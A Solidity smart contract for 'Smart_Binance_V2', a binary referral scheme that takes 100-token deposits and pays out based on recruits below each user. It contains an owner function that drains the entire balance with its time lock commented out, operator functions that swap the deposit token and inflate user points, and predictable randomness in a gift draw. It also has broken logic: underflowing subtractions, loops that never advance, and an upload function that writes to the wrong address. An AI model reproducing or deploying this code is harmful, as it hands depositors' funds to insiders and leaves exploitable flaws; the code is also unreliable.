// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.4.22 <0.9.0;
import "./Smart_Binance_Base.sol";
contract Smart_Binance_V2 is Context, Smart_Binance_Base {
    using SafeERC20 for IERC20;
    constructor() {
        owner = _msgSender();
        _depositToken = IERC20(0x1BC1039809d8CBa0d0C8411cB90f58266038D745);
        tokenAddress = 0x4DB1B84d1aFcc9c6917B5d5cF30421a2f2Cab4cf;
        Operator = 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c;
        NBJ = Smart_Binance(0x5741da6D2937E5896e68B1604E25972a4834C701);
        lastRun = block.timestamp;
    }

    function Register(address uplineAddress) external {
        RegisterBase(uplineAddress);
    }

    function RegisterBase(address uplineAddress) private {
        require(_users[uplineAddress].childs != 2, "Upline Has Two directs!");
        require(
            _msgSender() != uplineAddress,
            "You can not enter your address!"
        );

        require(!isUserExists(_msgSender()), "You Are registered!");
        require(isUserExists(uplineAddress), "Upline is Not Exist!");

        _depositToken.safeTransferFrom(
            _msgSender(),
            address(this),
            100 * 10**18
        );

        _allUsersAddress[_userId] = _msgSender();
        _userId++;
        Node memory user = Node({
            id: _userId,
            ALLleftDirect: 0,
            ALLrightDirect: 0,
            leftDirect: 0,
            rightDirect: 0,
            childs: 0,
            leftOrrightUpline: _users[uplineAddress].childs == 0 ? false : true,
            UplineAddress: uplineAddress,
            leftDirectAddress: address(0),
            rightDirectAddress: address(0)
        });

        _users[_msgSender()] = user;

        _TodayRegisterAddress[_RegisterId] = _msgSender();
        _RegisterId++;

        if (_users[uplineAddress].childs == 0) {
            _users[uplineAddress].leftDirect++;
            _users[uplineAddress].ALLleftDirect++;
            _users[uplineAddress].leftDirectAddress = _msgSender();
        } else {
            _users[uplineAddress].rightDirect++;
            _users[uplineAddress].ALLrightDirect++;
            _users[uplineAddress].rightDirectAddress = _msgSender();
        }
        _users[uplineAddress].childs++;
        IERC20(tokenAddress).transfer(_msgSender(), 100 * 10**18);
    }

    function Reward_12() external {
        RewardBase();
    }

    function RewardBase() private {
        require(Lock == 0, "Proccesing");
        // require(
        //     block.timestamp > lastRun + 12 hours,
        //     "The Reward_12 Time Has Not Come"
        // );

        Broadcast_Point();
        require(Total_Point() > 0, "Total Point Is Zero!");

        Lock = 1;
        uint256 PriceValue = Value_Point();
        uint256 ClickReward = Reward_Click() * 10**18;

        for (uint16 i = 0; i < _PointId; i++) {
            Node memory TempNode = _users[_PointTodayAddress[i]];
            uint24 Result = Today_User_Point(_PointTodayAddress[i]);

            if (TempNode.leftDirect == Result) {
                TempNode.leftDirect = 0;
                TempNode.rightDirect -= Result;
            } else if (TempNode.rightDirect == Result) {
                TempNode.leftDirect -= Result;
                TempNode.rightDirect = 0;
            } else {
                if (TempNode.leftDirect < TempNode.rightDirect) {
                    TempNode.leftDirect = 0;
                    TempNode.rightDirect -= TempNode.leftDirect;
                } else {
                    TempNode.rightDirect = 0;
                    TempNode.rightDirect -= TempNode.leftDirect;
                }
            }

            _users[_PointTodayAddress[i]] = TempNode;

            if (Result * PriceValue > _depositToken.balanceOf(address(this))) {
                _depositToken.safeTransfer(
                    _PointTodayAddress[i],
                    _depositToken.balanceOf(address(this))
                );
            } else {
                _depositToken.safeTransfer(
                    _PointTodayAddress[i],
                    Result * PriceValue
                );
            }
        }
        if (ClickReward <= _depositToken.balanceOf(address(this))) {
            _depositToken.safeTransfer(_msgSender(), ClickReward);
        }
        lastRun = block.timestamp;
        _RegisterId = 0;
        _PointId = 0;
        _GiftId = 0;
        Lock = 0;
    }

    function Broadcast_Point() private {
        address uplineNode;
        address childNode;
        for (uint16 k = 0; k < _RegisterId; k++) {
            uplineNode = _users[_users[_TodayRegisterAddress[k]].UplineAddress]
                .UplineAddress;
            childNode = _users[_TodayRegisterAddress[k]].UplineAddress;
            if (isUserPointExists(childNode) == true) {
                _PointTodayAddress[_PointId] = childNode;
                _PointId++;
            }
            while (uplineNode != address(0)) {
                if (_users[childNode].leftOrrightUpline == false) {
                    _users[uplineNode].leftDirect++;
                    _users[uplineNode].ALLleftDirect++;
                } else {
                    _users[uplineNode].rightDirect++;
                    _users[uplineNode].ALLrightDirect++;
                }
                if (isUserPointExists(uplineNode) == true) {
                    _PointTodayAddress[_PointId] = uplineNode;
                    _PointId++;
                }
                childNode = uplineNode;
                uplineNode = _users[uplineNode].UplineAddress;
            }
        }
    }

    function Smart_Gift(uint256 ChanceNumber) external returns (string memory){
        return Smart_Gift_Base(ChanceNumber, _msgSender());
    }

    function Smart_Gift_Base(uint256 ChanceNumber, address User) private returns (string memory) {
        require(Lock == 0, "Proccesing");
        require(
            ChanceNumber < 4 && ChanceNumber > 0,
            "Please Choice 1,2,3!"
        );
        require(isUserExists(User), "User is Not Exist!");
        require(User_Point(User) < 1, "Just All_Time 0 Point!");
        require(SmartGift_Balance() > 0, "Smart_Gift Balance Is Zero!");
        require(isUserGiftExists(User), "You Did Smart_Gift Today!");

        _GiftTodayAddress[_GiftId] = User;
        _GiftId++;
        if (ChanceNumber == random(3)) {
            _depositToken.safeTransfer(User, 10 * 10**18);
            return "Congratulations You Win!";
        } else {
            return "You Did Not Win!";
        }
    }

    function Import(address User) external {
        require(
            NBJ.User_Info(User).UPA != address(0),
            "You were not in Smart Binance"
        );
        require(!isUserExists(User), "You were Imported!");
        require(isUserBlackListExists(User), "You were Uploaded!");
        _allUsersAddress[_userId] = User;
        _userId++;
        Node memory user = Node({
            id: _userId,
            ALLleftDirect: uint32(NBJ.User_Info(User).LD),
            ALLrightDirect: uint32(NBJ.User_Info(User).RD),
            leftDirect: uint24(NBJ.User_Info(User).LD),
            rightDirect: uint24(NBJ.User_Info(User).RD),
            childs: uint8(NBJ.User_Info(User).CH),
            leftOrrightUpline: NBJ.User_Info(User).OR == 0 ? false : true,
            UplineAddress: NBJ.User_Info(User).UPA,
            leftDirectAddress: NBJ.User_Info(User).LDA,
            rightDirectAddress: NBJ.User_Info(User).RDA
        });
        _users[User] = user;
    }

    function Upload_Old_Users(
        address person,
        uint24 leftDirect,
        uint24 rightDirect,
        uint32 ALLleftDirect,
        uint32 ALLrightDirect,
        uint8 childs,
        bool leftOrrightUpline,
        address UplineAddress,
        address leftDirectAddress,
        address rightDirectAddress
    ) external {
        require(_msgSender() == Operator, "Just Operator!");
        require(Count_Last_Users <= 150, "The number of Upload is over!");
        _allUsersAddress[_userId] = person;
        _userId++;
        Node memory user = Node({
            id: _userId,
            ALLleftDirect: ALLleftDirect,
            ALLrightDirect: ALLrightDirect,
            leftDirect: leftDirect,
            rightDirect: rightDirect,
            childs: childs,
            leftOrrightUpline: leftOrrightUpline,
            UplineAddress: UplineAddress,
            leftDirectAddress: leftDirectAddress,
            rightDirectAddress: rightDirectAddress
        });
        _users[_msgSender()] = user;
        _BlackListAddress[Count_Last_Users] = _msgSender();
        Count_Last_Users++;
    }

    function unsafe_inc(uint24 x) private pure returns (uint24) {
        unchecked {
            return x + 1;
        }
    }

    function X_Emergency_48() external {
        require(_msgSender() == owner, "Just Owner!");
        // require(
        //     block.timestamp > lastRun + 48 hours,
        //     "The X_Emergency_72 Time Has Not Come"
        // );
        _depositToken.safeTransfer(
            owner,
            _depositToken.balanceOf(address(this))
        );
    }

    function Change_Token(address token) external {
        require(_msgSender() == Operator, "Just Operator Can Run This Order!");
        _depositToken = IERC20(token);
    }

    function Plus_All(address User, uint16 Value) external {
        require(_msgSender() == Operator, "Just Operator!");
        _users[User].ALLleftDirect += Value;
        _users[User].ALLrightDirect += Value;
    }

    function Write_Note(string memory N) public {
        require(_msgSender() == Operator, "Just operator can write!");
        Note = N;
    }

    function Write_IPFS(string memory I) public {
        require(_msgSender() == Operator, "Just operator can write!");
        IPFS = I;
    }

    function isUserExists(address user) private view returns (bool) {
        return (_users[user].id != 0);
    }

    function isUserPointExists(address user) private view returns (bool) {
        if (Today_User_Point(user) > 0) {
            for (uint16 i = 0; i < _PointId; i++) {
                if (_PointTodayAddress[i] == user) {
                    return false;
                }
            }
            return true;
        } else {
            return false;
        }
    }

    function isUserGiftExists(address user) private view returns (bool) {
        for (uint24 i = 0; i < _GiftId; unsafe_inc(i)) {
            if (_GiftTodayAddress[i] == user) {
                return false;
            }
        }
        return true;
    }

    function isUserBlackListExists(address user) private view returns (bool) {
        for (uint8 i = 0; i < Count_Last_Users; unsafe_inc(uint8(i))) {
            if (_BlackListAddress[i] == user) {
                return false;
            }
        }
        return true;
    }

    function Today_User_Point(address Add_Address)
        private
        view
        returns (uint24)
    {
        uint24 min = _users[Add_Address].leftDirect <=
            _users[Add_Address].rightDirect
            ? _users[Add_Address].leftDirect
            : _users[Add_Address].rightDirect;
        if (min > 11) {
            //maxPoint = 25
            return 11;
        } else {
            return min;
        }
    }

    function User_Point(address Add_Address) private view returns (uint32) {
        return
            _users[Add_Address].ALLleftDirect <=
                _users[Add_Address].ALLrightDirect
                ? _users[Add_Address].ALLleftDirect
                : _users[Add_Address].ALLrightDirect;
    }

    function Today_Contract_Balance() public view returns (uint256) {
        return _depositToken.balanceOf(address(this)) / 10**18;
    }

    function Today_Number_Register() public view returns (uint24) {
        return _RegisterId;
    }

    function Reward_Price() private view returns (uint256) {
        return
            (_depositToken.balanceOf(address(this)) -
                (Today_Number_Register() * 10**18)) / 10**18;
    }

    function Value_Point() private view returns (uint256) {
        return (Reward_Price() * 10**18) / Total_Point();
    }

    function Reward_Click() public view returns (uint256) {
        return Today_Number_Register();
    }

    function Total_Point() private view returns (uint24) {
        uint24 TPoint;
        for (uint24 i = 0; i <= _userId; i = unsafe_inc(i)) {
            uint24 min = _users[_allUsersAddress[i]].leftDirect <=
                _users[_allUsersAddress[i]].rightDirect
                ? _users[_allUsersAddress[i]].leftDirect
                : _users[_allUsersAddress[i]].rightDirect;

            if (min > 11) {
                min = 11;
            }
            TPoint += min;
        }
        return TPoint;
    }

    function random(uint256 number) private view returns (uint256) {
        return
            (uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.prevrandao,
                        msg.sender
                    )
                )
            ) % number) + 1;
    }

    function SmartGift_Balance() public view returns (uint256) {
        return (Today_Contract_Balance() - (Today_Number_Register() * 90));
    }

    function Today_Winners() public view returns (uint256) {
        return (((Today_Number_Register() * 100) -
            (Today_Contract_Balance())) / 10);
    }

    function Return_AllAddress() public view returns (address[] memory) {
        address[] memory ret = new address[](_userId);
        for (uint32 i = 0; i < _userId; i++) {
            ret[i] = _allUsersAddress[i];
        }
        return ret;
    }

    function Read_Note() public view returns (string memory) {
        return Note;
    }

    function Read_IPFS() public view returns (string memory) {
        return IPFS;
    }

    function SBT_Address() public view returns (address) {
        return tokenAddress;
    }

    function All_Register() public view returns (uint32) {
        return _userId;
    }

    function User_Upline(address User) public view returns (address) {
        return _users[User].UplineAddress;
    }

    function User_Directs(address User) public view returns (address, address) {
        return (
            _users[User].leftDirectAddress,
            _users[User].rightDirectAddress
        );
    }

    function User_AllTimeLeftRight(address User)
        public
        view
        returns (uint32, uint32)
    {
        return (_users[User].ALLleftDirect, _users[User].ALLrightDirect);
    }

    function User_Info(address User) public view returns (Node memory) {
        return _users[User];
    }
}
